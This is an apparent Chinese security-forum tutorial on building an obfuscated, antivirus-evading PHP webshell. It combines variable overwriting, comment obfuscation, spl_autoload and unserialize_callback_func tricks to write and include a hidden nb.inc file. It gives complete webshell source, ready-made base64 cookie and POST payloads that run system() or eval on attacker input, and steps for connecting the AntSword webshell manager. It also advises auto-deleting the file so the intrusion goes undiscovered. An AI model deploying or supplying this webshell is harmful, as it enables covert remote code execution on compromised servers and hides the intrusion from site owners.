0x00 上效果图
=========

我只测试了这几个，其它的各位师傅们自己测试呀

![phpmiansha.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-4f825831e064c70ad1de983f352a4295595bb1c9.png)

![phpmiansha2.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ba19375d223eb7d304217015876b937d785f5280.png)

![d.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-18096274e1850754eb49bdf5729b5e37e3d00b6a.png)

0x01 php知识点
===========

1.$$变量覆盖

$b里面存着a，$$b就是获取$b的值来作为变量名,所以就等于$a=123

![fugai.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-00b4bf1d522170621837060f68042efc1ae249d3.png)

2.注释混淆

我们可以用/\**/注释符在代码中随意插，可以看到正常运行  
$a=123;可以写成$a/*sssss*/=/*sssss*/123/*sssss*/;/*sssss\*/，并不会影响其结果

![zhushi;;.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-3019b6179b48280b3d08d3d20f460b6d96fc77d3.png)

3。spl\_autoload函数的使用

![php_spl.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e38eb7fc6f729a74231d0b3882ec3b3881391328.png)  
这是它的介绍，这里我举个例子，我们在nb.inc这个文件中写入`&lt;?php phpinfo()?&gt;`

![spl____2.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-fe58e952d76583eac292a809163454c357c9bf62.png)  
![spl____.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-6a3d7ec097d4e5d0b1f0a50cd4ddd7c2b6ca19ac.png)  
在php.php文件中写入spl\_autoload("nb"),当我们访问php.php的时候，spl\_autoload会自动包含当前目录下为nb.inc或者nb.php文件，这里是nb.inc，所以包含并执行了nb.inc

4.unserialize\_callback\_func

![uncall.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-6a131007ad8834b0831f272e5f80ea6ff5e48f78.png)  
它可以通过ini\_set来设置，它的作用说白了就是当我们反序列化一个不存在的类是会自动调用它设置的函数，这里我们可以把它与spl\_autoload一起使用，举个例子

这里依然用nb.inc

![spl____2.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-a983cba8c43786d1274d35206a5100b8329f82e6.png)

![ll.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-b1e7bc991bd6be155c11752224248b4ce012bf2e.png)

![llll.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-83c6d5f5b2b6ecabb96bd7c783a8cfe647baafa6.png)  
可以看到成功包含nb.inc，当我们反序列化一个不存在的类是它自动调用了unserialize\_callback\_func设置的spl\_autoload函数，spl\_autoload函数又自动去寻找inc的文件去包含，所以执行了nb.inc中的代码

5. **file\_put\_contents函数**  
    该函数作用就是把内容写入一个文件，后面会用到，它的用法是file\_put\_contents("文件名","要写入文件的内容")

6.**${ }**

这个中间可以内嵌php代码

![${}.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e2662b5fe7c85bb818bf009388efb0155cf3545e.png)

7.**("函数名")("函数参数")**

![(php).PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-fe61f4c35ae1b61b0bfe12c0519d19ee1698cde4.png)

![(php).PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-71355b2eb73c9d06d7178b8fdf0754262a5f1827.png)

这里我们可以配合${}一起用

![(php).PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-cb8cec4603eb3bade565e7cfe2ded329f8e7b074.png)

都是可以正常执行phpinfo的

0x02 实战
=======

因为直接在代码中写ini\_set("unserialize\_callback\_func","spl\_autoload")有点过于显眼，所以这里我们可以写成`ini_set($_POST['name'],$_POST['argv'])`但这样也并不是特别好，所以这里就用到上面的知识点了，我们可以利用base64解密和注释混淆一下

```php
$n="";
$n2="";
$cn="n";
$cn2="n2";
$name=base64_decode(/*ss00;//11plpdsssko9\[]1!@*/urldecode($_POST['name']));
$argv=/*ss00;//11plpdsssko9\[]1!@*/base64_decode(/*ss00;//11plpdsssko9\[]1!@*/urldecode($_POST['argv']));

$$cn=$name;
$$cn2=$argv;
ini_set($n,/*ss00;//11plpdsssko9\[]1!@*/$n2)/*ss00;//11plpdsssko9\[]1!@*/
;
```

![plpplpl.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-906af017041aa0abec9f96b108907337e390d88c.png)

![plpl.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-f5fb4e535e3f7d899f17e409ce9d8bc588b5b2ba.png)

我们传入name=base64加密和URL编码过后的unserialize\_callback\_func&amp;argv=base64加密和URL编码过后的spl\_autoload,可以看到是可以正常包含nb.inc的

**下一步**

实现包含的代码已经完成了，现在问题是对方没有inc文件，我们又不能上传inc文件怎么办？，这里就要用到上面所说的file\_put\_contents函数了，利用它来写入我们的inc文件

![mk.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-11fcc0932a7a471409f9b329d109703257969dd8.png)

![mk2.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-b3256c6f00d9fe09d4f9c129756de4f12e3c40d8.png)  
可以看到成功写入并且包含inc文件

但是这里直接写入nb.inc看着也显眼，这里我们改一下，用cookie来传递值，变量覆盖和利用${}配合("函数名")("函数参数")来执行file\_put\_contents函数，这里我们也一样用base64来加密

![cookie.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-3ac658d9c9267d889dceceda79ed38eb8d303e73.png)  
我们在cookie里面传入: c=base64和url编码过后的函数名;c2=base64和url编码过后的参数1（参数1是文件名）;c3=base64和url编码过后的参数2（参数2是要写入文件的内容）  
（注意！ cookie传参，每个参数以;连接，不是post中的&amp;）

![cookie.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-23f3de7b0baee1d4c3256d62b0dea42b57260a50.png)  
我们传入c=ZmlsZV9wdXRfY29udGVudHM%3D;c2=bmIuaW5j;c3=MTIzNDU2，成功在nb.inc中写入123456

这里我们在加一点魔法（利用注释混淆一下）

```php
$bh=(/*ss00;//11plpdsssko9\[]1!@*/"");
$b="bh";/*ss00;//11plpdsssko9\[]1!@*/
$$b=(base64_decode(/*ss00;//11plpdsssko9\[]1!@*/urldecode($_COOKIE['c'])));
$bn=base64_decode(urldecode($_COOKIE['c2']));
$bn2=base64_decode(urldecode($_COOKIE['c3']));
${/*ss00;//11plpdsssko9\[]1!@*/$bh/*ss00;//11plpdsssko9\[]1!@*/($bn,/*ss00;//11plpdsssko9\[]1!@*/
$bn2/*ss00;//11plpdsssko9\[]1!@*/
)/*ss00;//11plpdsssko9\[]1!@*/
};

```

注释混淆后的代码也是可以正常执行的

**在下一步**  
包含和写文件的代码都写完了，接下来是写写入文件中的代码如何执行我们要执行的命令，这里还是利用cookie传参+变量覆盖+${}+("函数名")("函数参数")来执行

```php
<?php
$p="";
$k="";
$b="";
$c="";
$m="c";
$a=($_COOKIE['code']);
$c23=base64_decode($_COOKIE['code2']);
$$m="b"; 
"";
$$c="k"; 
$$b="p"; 
$
$k=$a;
${$p($c23)};
```

这里用到了几个变量覆盖来获取cookie中的值，最后利用${}+("函数名")("函数参数")来执行代码  
我们在cookie中传入code=调用的函数名;code2=base64编码过后的参数  
我们在cookie中传入code=system;code2=ZGly

![system.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-68d1005fe182f5af75d6cd2e091435b1a5c2b42b.png)  
可以看到成功执行了system("dir")

既然可以成功执行，那我们在使用注释来进行混淆一下

```php
<?php
$p=/*this is a bug*/"";
$k="";
$b="";
$c="";
$m="c";
$a=(/*this is a bug*/
    $_COOKIE['code']
/*this is a bug*/);
$c23=base64_decode($_COOKIE['code2']);
$/*this is a bug*/
$m="b"; 
"";/**/$/*this is a bug*/
$c="k"; 
$/*this is a bug*/
$b="p"; 
$/*this is a bug*/
$k=$a;//
$
/*this is a bug*/{
/*this is a bug*/
$p/*this is a bug*/
/*this is a bug*/
($c23/*this is a bug*/)/*this is a bug*//*this is a bug*/}/*this is a bug*/;
```

经过注释混淆后的代码也是同样可以成功的

![system.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-15c1632fc4db87add3d266836bc5faea18bd8380.png)

那么经过注释混淆过后的代码就是我们要写入文件的内容了

**在在下一步**

我们把之前的给连接起来得到如下

**这是php的代码**

```php
<?php
$n="";
$n2="";
$cn="n";
$cn2="n2";
$name=base64_decode(/*ss00;//11plpdsssko9\[]1!@*/urldecode($_POST['name']));
$argv=/*ss00;//11plpdsssko9\[]1!@*/base64_decode(/*ss00;//11plpdsssko9\[]1!@*/urldecode($_POST['argv']));

$$cn=$name;
$$cn2=$argv;
ini_set($n,/*ss00;//11plpdsssko9\[]1!@*/$n2)/*ss00;//11plpdsssko9\[]1!@*/
;
$bh=(/*ss00;//11plpdsssko9\[]1!@*/"");
$b="bh";/*ss00;//11plpdsssko9\[]1!@*/
$$b=(base64_decode(urldecode($_COOKIE['c'])));
$bn=base64_decode(urldecode($_COOKIE['c2']));
$bn2=base64_decode(urldecode($_COOKIE['c3']));
${/*ss00;//11plpdsssko9\[]1!@*/$bh/*ss00;//11plpdsssko9\[]1!@*/($bn,/*ss00;//11plpdsssko9\[]1!@*/
$bn2/*ss00;//11plpdsssko9\[]1!@*/
)/*ss00;//11plpdsssko9\[]1!@*/
};
$nx="O:2:\"nb\":0:{}1";
unserialize($nx);
```

**这是要写入inc文件的代码**

```php
<?php
$p=/*this is a bug*/"";
$k="";
$b="";
$c="";
$m="c";
$a=(/*this is a bug*/
    $_COOKIE['code']
/*this is a bug*/);
$c23=base64_decode($_COOKIE['code2']);
$/*this is a bug*/
$m="b"; 
"";/**/$/*this is a bug*/
$c="k"; 
$/*this is a bug*/
$b="p"; 
$/*this is a bug*/
$k=$a;//
$
/*this is a bug*/{
/*this is a bug*/
$p/*this is a bug*/
/*this is a bug*/
($c23/*this is a bug*/)/*this is a bug*//*this is a bug*/}/*this is a bug*/;
```

接下来我们访问php文件，构建请求  
post传入：`name=dW5zZXJpYWxpemVfY2FsbGJhY2tfZnVuYw%3D%3D&amp;argv=c3BsX2F1dG9sb2Fk`  
cookie传入：`code=system;code2=ZGly（经过base64编码过后的命令）;c=ZmlsZV9wdXRfY29udGVudHM%3D;c2=bmIuaW5j;c3=这里是经过base64和url编码过后的需要写入文件的内容，由于过长就不写出来了`

![file.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e6370ae87860b46147f03e5d15f5ac0e018af083.png)

可以看到我们把内容成功写入到了nb.inc文件中

![end.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-b7d18821f282541b7f158007e1da2f17f8554787.png)

![cookie.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-4b87ffa019ca47598fc80c06c5970e0f75c3643b.png)

可以看到spl\_autoload成功包含，并且执行了我们的dir命令

0x03 总结
=======

这里因为需要各种传参和编码，比较麻烦，为了能在蚁剑这类的webshell管理工具连接,所以我把函数调用固定为eval，需要执行的命令改成了post请求，还有把更改unserialize\_callback\_func的方式改为了cookie传值

但是由于笔者这里不知道是什么原因，无法使用("eval")()，不知道为啥（但是system这些函数又可以），在这里恶心了半天，最后不得已在代码用eval函数

**php文件代码**

```php
<?php
$n="";
$n2="";
$cn="n";
$cn2="n2";
$name=base64_decode(/*ss00;//11plpdsssko9\[]1!@*/urldecode($_COOKIE['name']));
$argv=/*ss00;//11plpdsssko9\[]1!@*/base64_decode(/*ss00;//11plpdsssko9\[]1!@*/urldecode($_COOKIE['argv']));
$$cn=$name;
$$cn2=$argv;
ini_set($n,/*ss00;//11plpdsssko9\[]1!@*/$n2)/*ss00;//11plpdsssko9\[]1!@*/;
$bh=(/*ss00;//11plpdsssko9\[]1!@*/"");
$b="bh";/*ss00;//11plpdsssko9\[]1!@*/
$$b=(base64_decode(urldecode($_COOKIE['c'])));
$bn=base64_decode(urldecode($_COOKIE['c2']));
$bn2=base64_decode(urldecode($_COOKIE['c3']));
${/*ss00;//11plpdsssko9\[]1!@*/$bh/*ss00;//11plpdsssko9\[]1!@*/($bn,/*ss00;//11plpdsssko9\[]1!@*/
$bn2/*ss00;//11plpdsssko9\[]1!@*/
)/*ss00;//11plpdsssko9\[]1!@*/
};
$nx="O:2:\"nb\":0:{}1";
unserialize($nx);

```

**要写入inc文件的代码**（请求我已经构造好了，这串代码其实你们也可以不用看）

```php
<?php
$k=("");
$b=("");
$c=("");
$m=("c");
$a=/*this is a bug*/
/*this is a bug*/$_POST[/*this is a bug*/'code2']/*this is a bug*//*this is a bug*/;
$/*this is a bug*/
$m=/*this is a bug*/"b"/*this is a bug*/
; 
""/*this is a bug*/
;/**/
$/*this is a bug*/$c=/*this is a bug*/"k"/*this is a bug*/
; 
$p=/*this is a bug*/(""/*this is a bug*/
)/*this is a bug*/;
$/*this is a bug*/
$b="p"/*this is a bug*/
; 
$/*this is a bug*/
$k=/*this is a bug*/
$a/*this is a bug*/;//
"";eval(/*this is a bug*/
$p/*this is a bug*/)/*this is a bug*/
;
```

为了师傅们使用方便我已经构建好了请求  
cookie请求:`name=dW5zZXJpYWxpemVfY2FsbGJhY2tfZnVuYw%3D%3D;argv=c3BsX2F1dG9sb2Fk;c=ZmlsZV9wdXRfY29udGVudHM%3D;c2=bmIuaW5j;c3=PD9waHAKJGs9KCIiKTsKJGI9KCIiKTsKJGM9KCIiKTsKJG09KCJjIik7CiRhPS8qdGhpcyBpcyBhIGJ1ZyovCi8qdGhpcyBpcyBhIGJ1ZyovJF9QT1NUWy8qdGhpcyBpcyBhIGJ1ZyovJ2NvZGUyJ10vKnRoaXMgaXMgYSBidWcqLy8qdGhpcyBpcyBhIGJ1ZyovOwokLyp0aGlzIGlzIGEgYnVnKi8KJG09Lyp0aGlzIGlzIGEgYnVnKi8iYiIvKnRoaXMgaXMgYSBidWcqLwo7IAoiIi8qdGhpcyBpcyBhIGJ1ZyovCjsvKiovCiQvKnRoaXMgaXMgYSBidWcqLyRjPS8qdGhpcyBpcyBhIGJ1ZyovImsiLyp0aGlzIGlzIGEgYnVnKi8KOyAKJHA9Lyp0aGlzIGlzIGEgYnVnKi8oIiIvKnRoaXMgaXMgYSBidWcqLwopLyp0aGlzIGlzIGEgYnVnKi87CiQvKnRoaXMgaXMgYSBidWcqLwokYj0icCIvKnRoaXMgaXMgYSBidWcqLwo7IAokLyp0aGlzIGlzIGEgYnVnKi8KJGs9Lyp0aGlzIGlzIGEgYnVnKi8KJGEvKnRoaXMgaXMgYSBidWcqLzsvLwoiIjtldmFsKC8qdGhpcyBpcyBhIGJ1ZyovCiRwLyp0aGlzIGlzIGEgYnVnKi8pLyp0aGlzIGlzIGEgYnVnKi8KOw==`

post请求:`code2=要执行的命令` 如code2=system("dir");

师傅们想更改写入inc文件的名字的话，只需要更改cookie中的c2既可(记得base64编码)(默认名字为nb.inc)(这里不能用index.inc这种名，会导致无法包含,至少我是这样的)

**webshell管理工具连接（中国蚁剑）**

第一步： 利用上面的cookie去访问我们的php文件（**先访问，要生成inc文件**）  
第二步： 如图

1.url连接那里填写对应的地址

![yiji.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-a2bf502c5f268c6f7ad71d407ee107baeb8b635c.png)

2.配置cookie（上面的那串cookie）

![yiju.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-d9ef3bbcd7e320b069f79467b98e128d8a455f1a.png)

最后连接即可

![yijn.PNG](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-caf9ef15fae406d10e4cc2fa357b3f3daf2e7162.png)

师傅们可以自己在代码中加入自动删除inc文件的代码，防止被发现

最后祝师傅们玩得快心呀！